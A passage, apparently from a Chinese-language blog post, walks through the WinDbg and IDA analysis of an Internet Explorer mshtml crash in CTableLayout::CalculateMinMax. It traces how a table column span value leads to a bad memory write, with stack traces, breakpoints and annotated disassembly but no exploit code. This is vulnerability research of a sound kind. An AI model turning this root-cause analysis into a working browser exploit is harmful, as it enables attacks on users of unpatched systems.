class="number">00000001</span> <span class="number">00000007</span> <span class="number">00003832</span> msls31!LsCreateLine+<span class="number">0xcb</span></span><br><span class="line"><span class="number">0452e588</span> <span class="number">67</span>d017cc <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">07b</span>fafc0 mshtml!CLSMeasurer::LSDoCreateLine+<span class="number">0x127</span></span><br><span class="line"><span class="number">0452e62</span>c <span class="number">67</span>d01ef5 <span class="number">0452</span>ee90 <span class="number">0001769</span>c <span class="number">00000000</span> mshtml!CLSMeasurer::LSMeasure+<span class="number">0x34</span></span><br><span class="line"><span class="number">0452e674</span> <span class="number">67</span>d01db1 <span class="number">00000000</span> <span class="number">00017e6</span>c <span class="number">00000083</span> mshtml!CLSMeasurer::Measure+<span class="number">0x1e6</span></span><br><span class="line"><span class="number">0452e698</span> <span class="number">67</span>d011a2 <span class="number">00017e6</span>c <span class="number">00000083</span> <span class="number">0779b</span>f40 mshtml!CLSMeasurer::MeasureLine+<span class="number">0x1c</span></span><br><span class="line"><span class="number">0452e748</span> <span class="number">67</span>d2a8f6 <span class="number">0452</span>ec68 <span class="number">07470f</span>d8 <span class="number">00000083</span> mshtml!CRecalcLinePtr::MeasureLine+<span class="number">0x46d</span></span><br><span class="line"><span class="number">0452</span>ef50 <span class="number">67</span>d2b304 <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">0000000</span>e mshtml!CDisplay::RecalcLines+<span class="number">0x8bb</span></span><br><span class="line"><span class="number">0452f</span>0a0 <span class="number">67</span>d28c5c <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">0000000</span>e mshtml!CDisplay::UpdateView+<span class="number">0x208</span></span><br><span class="line"><span class="number">0452f</span>154 <span class="number">67</span>d29ee3 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">0873</span>cf10 mshtml!CFlowLayout::CommitChanges+<span class="number">0x9c</span></span><br><span class="line"><span class="number">0452f</span>264 <span class="number">67</span>c0eb06 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcTextSize+<span class="number">0x30f</span></span><br><span class="line"><span class="number">0452f</span>4ec <span class="number">67</span>d002ee <span class="number">0779b</span>f00 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeCoreCompat+<span class="number">0x1045</span></span><br><span class="line"><span class="number">0452f</span>508 <span class="number">67</span>d00367 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeCore+<span class="number">0x49</span></span><br><span class="line"><span class="number">0452f</span>544 <span class="number">67</span>d0029c <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CBodyLayout::CalcSizeCore+<span class="number">0xd8</span></span><br><span class="line"><span class="number">0452f</span>57c <span class="number">67</span>cfcc48 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeVirtual+<span class="number">0x1af</span></span><br><span class="line"><span class="number">0452f</span>6b4 <span class="number">67</span>c84121 <span class="number">0779b</span>f00 <span class="number">00000001</span> <span class="number">00000000</span> mshtml!CLayout::CalcSize+<span class="number">0x2b8</span></span><br><span class="line"><span class="number">0452f</span>7a4 <span class="number">67</span>d290f9 <span class="number">00100000</span> <span class="number">00000007</span> <span class="number">059</span>ebeb4 mshtml!CFlowLayout::DoLayout+<span class="number">0x543</span></span><br><span class="line"><span class="number">0452f</span>7e0 <span class="number">67</span>cec8ca <span class="number">059</span>eb870 <span class="number">00100000</span> <span class="number">0452f</span>840 mshtml!CView::ExecuteLayoutTasks+<span class="number">0x3b</span></span><br><span class="line"><span class="number">0452f</span>824 <span class="number">67</span>d2336d <span class="number">00000000</span> <span class="number">0452f</span>870 <span class="number">0000008</span>d mshtml!CView::EnsureView+<span class="number">0x355</span></span><br><span class="line"><span class="number">0452f</span>848 <span class="number">67</span>ce94b2 <span class="number">059</span>eb870 <span class="number">00000000</span> <span class="number">06</span>d24d58 mshtml!CView::EnsureViewCallback+<span class="number">0xd3</span></span><br><span class="line"><span class="number">0452f</span>87c <span class="number">67</span>cd37f7 <span class="number">0452f</span>918 <span class="number">00008002</span> <span class="number">00000000</span> mshtml!GlobalWndOnMethodCall+<span class="number">0xff</span></span><br><span class="line"><span class="number">0452f</span>89c <span class="number">75</span>ce86ef <span class="number">000f</span>0402 <span class="number">00000012</span> <span class="number">00000000</span> mshtml!GlobalWndProc+<span class="number">0x10c</span></span><br><span class="line"><span class="number">0452f</span>8c8 <span class="number">75</span>ce8876 <span class="number">67</span>cc1de3 <span class="number">000f</span>0402 <span class="number">00008002</span> USER32!InternalCallWinProc+<span class="number">0x23</span></span><br><span class="line"><span class="number">0452f</span>940 <span class="number">75</span>ce89b5 <span class="number">00000000</span> <span class="number">67</span>cc1de3 <span class="number">000f</span>0402 USER32!UserCallWinProcCheckWow+<span class="number">0x14b</span></span><br><span class="line"><span class="number">0452f</span>9a0 <span class="number">75</span>ce8e9c <span class="number">67</span>cc1de3 <span class="number">00000000</span> <span class="number">0452f</span>a28 USER32!DispatchMessageWorker+<span class="number">0x35e</span></span><br><span class="line"><span class="number">0452f</span>9b0 <span class="number">6</span>cde04a6 <span class="number">0452f</span>9c8 <span class="number">00000000</span> <span class="number">00752f</span>58 USER32!DispatchMessageW+<span class="number">0xf</span></span><br><span class="line"><span class="number">0452f</span>a28 <span class="number">6</span>cdf0446 <span class="number">05688808</span> <span class="number">00000000</span> <span class="number">006</span>ccff0 IEFRAME!CTabWindow::_TabWindowThreadProc+<span class="number">0x452</span></span><br><span class="line"><span class="number">0452f</span>ae0 <span class="number">75f</span>549bd <span class="number">00752f</span>58 <span class="number">00000000</span> <span class="number">0452f</span>afc IEFRAME!LCIETab_ThreadProc+<span class="number">0x2c1</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> C:\Windows\system32\kernel32.dll - </span><br><span class="line"><span class="number">0452f</span>af0 <span class="number">76361174</span> <span class="number">006</span>ccff0 <span class="number">0452f</span>b3c <span class="number">7741b</span>3f5 iertutil!CIsoScope::RegisterThread+<span class="number">0xab</span></span><br><span class="line">WARNING: Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line"><span class="number">0452f</span>afc <span class="number">7741b</span>3f5 <span class="number">006</span>ccff0 <span class="number">73</span>d26994 <span class="number">00000000</span> kernel32!BaseThreadInitThunk+<span class="number">0x12</span></span><br><span class="line"><span class="number">0452f</span>b3c <span class="number">7741b</span>3c8 <span class="number">75f</span>549af <span class="number">006</span>ccff0 <span class="number">00000000</span> ntdll!__RtlUserThreadStart+<span class="number">0x70</span></span><br><span class="line"><span class="number">0452f</span>b54 <span class="number">00000000</span> <span class="number">75f</span>549af <span class="number">006</span>ccff0 <span class="number">00000000</span> ntdll!_RtlUserThreadStart+<span class="number">0x1b</span></span><br></pre></td></tr></table></figure></p>
+<p>这里可能会出现没有符号的问题，解决方法如下：<br>在windbg的窗口里输入<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p>
+<p>然后可以看见<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-072303.png" alt=""></p>
+<p>分析一下<br>首先导致崩溃的（分析内容在下述代码注释了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; uf mshtml!CTableColCalc::AdjustForCol</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">67f3f152 8bff            mov     edi,edi</span><br><span class="line">67f3f154 55              push    ebp</span><br><span class="line">67f3f155 8bec            mov     ebp,esp</span><br><span class="line">67f3f157 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">67f3f159 53              push    ebx</span><br><span class="line">67f3f15a 8b5d08          mov     ebx,dword ptr [ebp+8]</span><br><span class="line">67f3f15d 57              push    edi</span><br><span class="line">67f3f15e 8bc1            mov     eax,ecx</span><br><span class="line">67f3f160 83e00f          and     eax,0Fh</span><br><span class="line">67f3f163 8d7e18          lea     edi,[esi+18h]；可以看到edi来源于esi，但是esi的处理代码并不在这个函数里，所以继续向上回溯。</span><br><span class="line">67f3f166 50              push    eax</span><br><span class="line">67f3f167 890f            mov     dword ptr [edi],ecx；向edi指向的内存里拷贝值导致crash</span><br><span class="line">67f3f169 e89eacdbff      call    mshtml!CUnitValue::IsScalerUnit (67cf9e0c)</span><br><span class="line">67f3f16e 85c0            test    eax,eax</span><br><span class="line">67f3f170 7411            je      mshtml!CTableColCalc::AdjustForCol+0x31 (67f3f183)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>这样就清楚了，我们要在上一个函数下断。<br>重启一下windbg，重新attach<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:021&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:021&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">0:021&gt; sxe ld:mshtml</span><br><span class="line">0:021&gt; g</span><br></pre></td></tr></table></figure></p>
+<p>这个时候把poc拖进去（注意到没有提示允许activeX运行）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">Page heap: pid 0xDC4: page heap enabled with flags 0x3.</span><br><span class="line">(dc4.e34): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=0016f5d8 edx=774064f4 esi=fffffffe edi=00000000</span><br><span class="line">eip=7745e60e esp=0016f5f4 ebp=0016f620 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">7745e60e cc              int     3</span><br><span class="line">1:014&gt; g</span><br><span class="line">ModLoad: 691c0000 69772000   C:\Windows\System32\mshtml.dll</span><br><span class="line">eax=07237000 ebx=00000000 ecx=00171000 edx=00000000 esi=7ffda000 edi=0467b384</span><br><span class="line">eip=774064f4 esp=0467b29c ebp=0467b2f0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">774064f4 c3              ret</span><br><span class="line"></span><br><span class="line">1:025&gt; lm m mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">691c0000 69772000   mshtml     (deferred)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>lm (List Loaded Modules)<br>lm命令显示指定的已加载模块。输出中包含模块状态和路径。</p>
+<ul>
+<li>m Pattern<br>指定模块名必须匹配的模板。Pattern可以包含各种通配符和修饰符。关于语法的更多信息，查看字符串通配符语法。</li>
+</ul>
+</li>
+<li><p>sx 命令显示当前进程的异常列表和所有非异常的事件列表，并且显示调试器遇到每个异常和事件时的行为。</p>
+<ul>
+<li>sxe Break<br>当发生该异常时，在任何错误处理器被激活之前目标立即中断到调试器中。这种处理类型称为第一次处理机会。</li>
+</ul>
+</li>
+<li><p>ld (Load Symbols)<br>ld 命令加载指定模块的符号并刷新所有模块信息。</p>
+</li>
+</ul>
+<p>这样组合起来，就是ld制定mshtml加载，然后sxe强制在加载这个模块后断下。<br>现在我们就可以对这个函数下断了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">1:025&gt; g</span><br><span class="line">(c84.798): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.8e8): Unknown exception - code 80010108 (first chance)</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>bp, bu, bm (Set Breakpoint)<br>bp、bu和bm命令设置一个或多个软断点(software breakpoints)。可以组合位置、条件和选项来设置各种不同类型的软断点。</li>
+<li>bl (Breakpoint List)<br>bl 命令列出已存在的断点的信息。</li>
+<li>g 命令开始指定进程或线程的执行。这种执行将会在程序结束、遇到BreakAddress 或者其他造成调试器停止的事件发生时停止。</li>
+</ul>
+<p>我在调试的时候辅助了一下IDA，其实是可以不用的。<br>直接静态分析找到CalculateMinMax<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085115.png" alt=""><br>另外这里也需要导入符号。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085211.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085325.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085236.png" alt=""></p>
+<p>单步继续跟随调试，按p就可以单步执行（ 不进入函数那种），不过其实按回车也可以。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; </span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018c esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x2:</span><br><span class="line">692d018c 55              push    ebp</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018d esp=0467e4ac ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x3:</span><br><span class="line">692d018d 8bec            mov     ebp,esp</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018f esp=0467e4ac ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x5:</span><br><span class="line">692d018f 81ec90000000    sub     esp,90h</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0195 esp=0467e41c ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xb:</span><br><span class="line">692d0195 53              push    ebx</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0196 esp=0467e418 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">692d0196 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0467e4b4=0492aea8</span><br></pre></td></tr></table></figure></p>
+<p>注意到<strong>mov     ebx,dword ptr [ebp+8] ss:0023:0467e4b4=0492aea8</strong>，[ebp+8]是参数1(知道栈吧..)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd poi(ebp+8)</span><br><span class="line">0492aea8-&gt;poi(ebp+8)  691c9868 06216f30 071d8fb8 69384918</span><br><span class="line">0492aeb8  00000001 00000000 0108080d ffffffff</span><br><span class="line">0492aec8  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492aed8  0001769c 0000a7f8 00000000 00000000</span><br><span class="line">0492aee8  00000000 00412802 00000000 00000000</span><br><span class="line">0492aef8  00000000 00000001 ffffffff ffffffff</span><br><span class="line">0492af08  ffffffff ffffffff 691c9fd0 00000004</span><br><span class="line">0492af18  00000004 0497eff0 691c9fd0 00000004</span><br></pre></td></tr></table></figure>
+<ul>
+<li>dd    双字值(4字节)<br>默认的显示数量为32个DWORD(128字节)。</li>
+<li>poi()<br>指定地址处的指针大小的数据。指针大小或者是 32 位或者是 64 位。在内核调试模式，大小基于目标计算机上的处理器。在 Intel Itanium 计算机上用户模式调试下，大小或者是 32 位或者是 64 位，依赖于目标应用程序。所以，如果你想得到指针大小的数据最好使用 poi 运算符。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd poi(ebp+8)</span><br><span class="line">0492aea8  691c9868 06216f30 071d8fb8 69384918</span><br><span class="line">0492aeb8  00000001 00000000 0108080d ffffffff</span><br><span class="line">0492aec8  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492aed8  0001769c 0000a7f8 00000000 00000000</span><br><span class="line">0492aee8  00000000 00412802 00000000 00000000</span><br><span class="line">0492aef8  00000000 00000001 ffffffff ffffffff</span><br><span class="line">0492af08  ffffffff ffffffff 691c9fd0 00000004</span><br><span class="line">0492af18  00000004 0497eff0 691c9fd0 00000004</span><br><span class="line">1:025&gt; ln 691c9868 </span><br><span class="line">(691c9868)   mshtml!CTableLayout::`vftable&apos;   |  (691c99a8)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>ln 命令显示给定地址处的或者最近的符号。</li>
+</ul>
+<p>可见参数1引用的是CTableLayout对象，也就是<code>&lt;table&gt;</code>标签中的对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0199 esp=0467e418 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">692d0199 56              push    esi</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d019a esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x10:</span><br><span class="line">692d019a 8b750c          mov     esi,dword ptr [ebp+0Ch] ss:0023:0467e4b8=0467e740</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d019d esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x13:</span><br><span class="line">692d019d 8b4628          mov     eax,dword ptr [esi+28h] ds:0023:0467e768=00000000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d01a0 esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x16:</span><br><span class="line">692d01a0 898574ffffff    mov     dword ptr [ebp-8Ch],eax ss:0023:0467e420=00171000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d01a6 esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">692d01a6 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:0492aefc=00000001</span><br></pre></td></tr></table></figure></p>
+<p>这里的ebx+54h指向的是table标签里的col元素的span值，在poc中只有一个span值1，所以这里赋值1.</p>
+<p>讲道理，用windbg这样看汇编太难受了，接下来我们用IDA看吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">74</span>D3018A</span><br><span class="line">.text:<span class="number">74</span>D3018A                 mov     edi, edi</span><br><span class="line">.text:<span class="number">74</span>D3018C                 push    ebp</span><br><span class="line">.text:<span class="number">74</span>D3018D                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">74</span>D3018F                 sub     esp, <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">74</span>D30195                 push    ebx             ; <span class="class"><span class="keyword">struct</span> <span class="title">tagSIZE</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">74</span>D30196                 mov     ebx, [ebp+arg_0];-&gt; 参数<span class="number">1</span>引用的是CTableLayout对象，也就是table标签在内存的对象。</span><br><span class="line">.text:<span class="number">74</span>D30199                 push    esi             ; <span class="class"><span class="keyword">struct</span> <span class="title">CTableCalcInfo</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">74</span>D3019A                 mov     esi, [ebp+arg_4]</span><br><span class="line">.text:<span class="number">74</span>D3019D                 mov     eax, [esi+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">74</span>D301A0                 mov     [ebp+var_8C], eax</span><br><span class="line">.text:<span class="number">74</span>D301A6                 mov     eax, [ebx+<span class="number">54</span>h]; -&gt; span属性值的和，我们将其标记为spansum</span><br><span class="line">.text:<span class="number">74</span>D301A9                 mov     [ebp+arg_0], eax; -&gt; arg_0=spansum</span><br><span class="line">.text:<span class="number">74</span>D301AC                 mov     eax, [ebx+<span class="number">128</span>h]</span><br><span class="line">.text:<span class="number">74</span>D301B2                 shr     eax, <span class="number">2</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">.text:<span class="number">74</span>D30293 loc_74D30293:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)+<span class="number">105</span>j</span><br><span class="line">.text:<span class="number">74</span>D30293                 mov     edx, [ebp+arg_0];-&gt; edx=arg_0=spansum</span><br><span class="line">.text:<span class="number">74</span>D30296                 mov     eax, edx</span><br><span class="line">.text:<span class="number">74</span>D30298                 sub     eax, ecx</span><br><span class="line">.text:<span class="number">74</span>D3029A                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:<span class="number">74</span>D3029D                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">74</span>D3029F                 pop     eax</span><br><span class="line">.text:<span class="number">74</span>D302A0                 setz    al</span><br><span class="line">.text:<span class="number">74</span>D302A3                 mov     [ebx+<span 